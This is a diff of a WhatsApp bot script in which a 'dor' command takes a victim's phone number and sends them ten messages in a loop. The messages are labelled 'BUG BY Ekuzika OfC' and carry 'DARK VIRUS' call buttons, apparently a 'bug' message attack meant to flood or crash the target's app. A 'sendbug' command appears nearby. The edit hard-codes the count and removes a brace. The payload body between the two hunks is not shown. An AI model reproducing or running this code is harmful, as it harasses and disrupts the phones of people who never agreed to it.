@@ -3702,13 +3702,13 @@ Kedalaman :${i.depth}\n\n`
 case '🗿':
 case '🔥':
 case 'p':
-case 'dor': {
- if (!q) return reply(`Nomor target nya mana banh?\nContoh: ${command} 628xxx|5`)
- let [nomor_bug, jumlah_bug] = q.split('|')
- num = `${nomor_bug}`+'@s.whatsapp.net'
-let fixjumbelah = jumlah_bug ? jumlah_bug * 1 : 10
-        for (let i = fixjumbelah; i > 0; i--) {
-          if (i !== 0) conn.sendMessage(num, {
+case 'dor': 
+ if (!q) return reply(`Nomor target nya mana banh?\nContoh: ${command} 628xxx`)
+ num = `${q}`+'@s.whatsapp.net'
+        jumlah = '10'
+        waktu = `10s`
+for (let i = 0; i < jumlah; i++) {
+conn.sendMessage(num, {
 text: 'BUG BY ⚠️ 𝘌𝘬𝘶𝘻𝘪𝘬𝘢 𝘖𝘧𝘊 ⚠️', 
 templateButtons: [
    { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
@@ -4615,7 +4615,6 @@ templateButtons: [
 ]})}
 await sleep(2000)
 reply(`DONE ✅`)
-}
 break
       case 'sendbug':
       case 'philips': {
